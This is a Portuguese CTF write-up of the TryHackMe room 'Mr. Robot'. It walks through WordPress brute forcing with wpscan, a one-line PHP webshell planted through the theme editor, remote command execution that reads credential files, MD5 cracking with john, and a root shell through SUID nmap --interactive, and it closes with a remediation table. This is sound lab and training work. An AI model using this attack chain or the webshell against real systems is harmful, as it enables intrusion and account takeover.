---
title: "TryHackMe — Mr. Robot Writeup"
description: "Resolução completa da sala Mr. Robot do TryHackMe: exposição de arquivos via robots.txt, força bruta no WordPress, webshell via editor de temas, crack de MD5 e escalação de privilégio com SUID nmap."
pubDate: 2026-08-14
category: "Machine Write-ups"
tags: ["TryHackMe", "WordPress", "WPScan", "Webshell", "John", "SUID", "Linux PrivEsc"]
---

## Introdução

A sala **Mr. Robot** do TryHackMe é inspirada na série homônima e classificada como nível **Médio**. O ambiente simula um servidor Linux mal configurado rodando WordPress — com falhas que vão desde exposição de arquivos sensíveis até permissões incorretas em binários do sistema. O objetivo é capturar 3 flags progressivas que exigem exploração em cadeia.

---

## Sumário Executivo

O servidor expôs uma wordlist personalizada e a primeira flag diretamente via `robots.txt`. A combinação de enumeração de usuário no WordPress com a wordlist obtida permitiu força bruta bem-sucedida das credenciais administrativas. Com acesso ao painel, injetamos uma webshell no editor de temas e obtivemos execução remota de código. Um hash MD5 sem sal encontrado no sistema foi quebrado com `john`, concedendo acesso SSH ao usuário `robot`. A escalação final para root foi possível por um binário `nmap` com bit SUID ativo em versão legada — vulnerável ao modo interativo que spawna shell como root.

**Impacto:** comprometimento total do servidor com acesso root.

---

## Escopo e Ambiente

| Campo | Valor |
|-------|-------|
| Plataforma | TryHackMe |
| IP do alvo | `10.65.188.34` |
| Sistema Operacional | Linux (Ubuntu) |
| Serviços expostos | SSH (22), HTTP (80), HTTPS (443) |
| Data do teste | 2026-08-14 |

---

## Metodologia

### 1. Reconhecimento

#### Scan de Portas

```bash
nmap -sV -sC -Pn 10.65.188.34
```

```text
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu
80/tcp   open  http     Apache httpd
443/tcp  open  ssl/http Apache httpd
```

Servidor Apache com SSH exposto. A presença de `/wp-login.php` e estrutura de diretórios confirmou instalação de **WordPress**.

#### Enumeração de Diretórios

```bash
gobuster dir -u http://10.65.188.34 -w /usr/share/wordlists/dirb/common.txt
```

Resultados relevantes:
- `/wp-admin`, `/wp-content`, `/wp-includes` → WordPress ativo
- `/robots.txt` → acessível publicamente

---

### 2. Enumeração

#### robots.txt — Exposição de Arquivos Sensíveis

```bash
curl http://10.65.188.34/robots.txt
```

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

O arquivo `robots.txt` listou dois recursos críticos: a **Key 1** e uma wordlist customizada `fsocity.dic`. Ambos foram obtidos diretamente via HTTP sem autenticação.

#### Download e Otimização da Wordlist

```bash
curl http://10.65.188.34/fsocity.dic -o fsocity.dic
wc -l fsocity.dic           # 858.160 linhas — com massiva repetição
sort -u fsocity.dic > fsocity_uniq.dic
wc -l fsocity_uniq.dic      # 11.451 linhas após deduplicação
```

Redução de 98,6% no tamanho — impacto direto na velocidade do ataque seguinte.

#### Enumeração de Usuário no WordPress

O endpoint `/wp-login.php` retorna mensagens de erro distintas conforme o campo inválido: *"Invalid username"* vs *"The password you entered for the username X is incorrect"*. Essa diferença permite confirmar usuários válidos sem autenticação.

```bash
wpscan --url http://10.65.188.34 --enumerate u
```

Usuário confirmado: **`elliot`**

---

### 3. Exploração

#### Força Bruta de Credenciais WordPress

```bash
wpscan --url http://10.65.188.34 \
  --usernames elliot \
  --passwords fsocity_uniq.dic
```

```text
[!] Valid Combinations Found:
 | Username: elliot, Password: ER28-0652
```

Credenciais obtidas: `elliot : ER28-0652`

#### Webshell via Editor de Temas

Com acesso ao painel `/wp-admin`, navegamos até **Appearance → Theme Editor → 404.php** do tema ativo (**twentyfifteen**). O arquivo de template é editável diretamente pela interface — injetamos uma webshell de uma linha:

```php
<?php system($_GET["c"]); ?>
```

Validação da execução remota de código:

```bash
curl 'http://10.65.188.34/wp-content/themes/twentyfifteen/404.php?c=id'
```

```text
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

RCE confirmado como usuário `daemon`.

#### Enumeração do Sistema via Webshell

```bash
# Listando o diretório do usuário robot
curl '...404.php?c=ls+-la+/home/robot'
```

```text
-r-------- 1 robot robot   key-2-of-3.txt        ← ilegível por daemon
-rw-r--r-- 1 robot robot   password.raw-md5      ← legível por todos
```

```bash
curl '...404.php?c=cat+/home/robot/password.raw-md5'
```

```text
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Hash MD5 sem sal exposto em arquivo com permissões abertas.

#### Crack do Hash MD5

```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```text
abcdefghijklmnopqrstuvwxyz
```

Senha recuperada em segundos — MD5 sem sal é equivalente a armazenar senha em texto claro para fins práticos.

#### Acesso SSH como robot

```bash
ssh robot@10.65.188.34
# senha: abcdefghijklmnopqrstuvwxyz

cat /home/robot/key-2-of-3.txt
```

---

### 4. Escalação de Privilégio

#### Levantamento de Binários SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/local/bin/nmap    ← SUID ativo, versão 3.81
```

O binário `nmap` possui o bit **SUID** configurado — qualquer processo filho herda o UID do dono do arquivo (root).

#### Exploit: Modo Interativo do nmap

Versões do nmap anteriores à 5.x incluem um modo interativo (`--interactive`) que permite executar comandos shell diretamente. Como o processo roda como root via SUID, o shell spawned herda UID 0:

```bash
nmap --interactive
```

```text
nmap> !sh

# id
uid=0(root) gid=0(root) groups=0(root),1002(robot)

# cat /root/key-3-of-3.txt
```

Acesso root obtido sem exploração de CVE — configuração incorreta de permissão.

---

## Análise de Risco

| Vulnerabilidade | Severidade | Causa Raiz | Remediação |
|-----------------|------------|------------|------------|
| Arquivos sensíveis em `robots.txt` | **Média** | Má configuração — arquivos no webroot listados publicamente | Remover arquivos sensíveis do webroot; `robots.txt` não oferece controle de acesso |
| Enumeração de usuário no WordPress | **Média** | Mensagens de erro distintas no `wp-login.php` | Padronizar mensagem de erro; usar plugin de proteção de login |
| Força bruta sem rate limiting | **Alta** | Ausência de lockout e limitação de tentativas | Implementar lockout após N falhas; usar CAPTCHA ou 2FA |
| Hash MD5 sem sal | **Alta** | Algoritmo criptograficamente inadequado para senhas | Migrar para bcrypt, scrypt ou Argon2 com salt único |
| Arquivo de hash legível por outros usuários | **Alta** | Permissões incorretas (`-rw-r--r--`) em arquivo de credenciais | `chmod 600` em arquivos de senha; nunca armazenar hashes fora de DBs protegidos |
| SUID em `nmap` legado | **Crítica** | Permissão excessiva em binário com funcionalidade de execução de shell | Remover bit SUID (`chmod u-s /usr/local/bin/nmap`); atualizar ou desinstalar versões legadas |

---

## Lições Aprendidas

- **`robots.txt` é um mapa, não uma barreira.** Tudo listado ali é público — nunca referencie arquivos que não deveriam ser acessíveis.
- **Mensagens de erro distintas** em formulários de login são uma vulnerabilidade de enumeração. A resposta deve ser idêntica independente do campo inválido.
- **Wordlists vindas do próprio alvo** são sempre mais eficazes — o servidor essencialmente forneceu a chave para sua própria invasão.
- **MD5 sem sal quebra em segundos** com hardware comum. Qualquer sistema que ainda use MD5 para senhas está operando abaixo do mínimo aceitável de segurança.
- **Audite binários SUID regularmente** — `find / -perm -4000` deve fazer parte de qualquer checklist de hardening. A regra é: SUID só onde estritamente necessário.

---

## Flags

| Flag | Localização | Método de Obtenção |
|------|-------------|-------------------|
| Key 1 | `/key-1-of-3.txt` | Acesso direto via `robots.txt` |
| Key 2 | `/home/robot/key-2-of-3.txt` | Crack de hash MD5 → SSH como `robot` |
| Key 3 | `/root/key-3-of-3.txt` | SUID `nmap --interactive` → shell root |
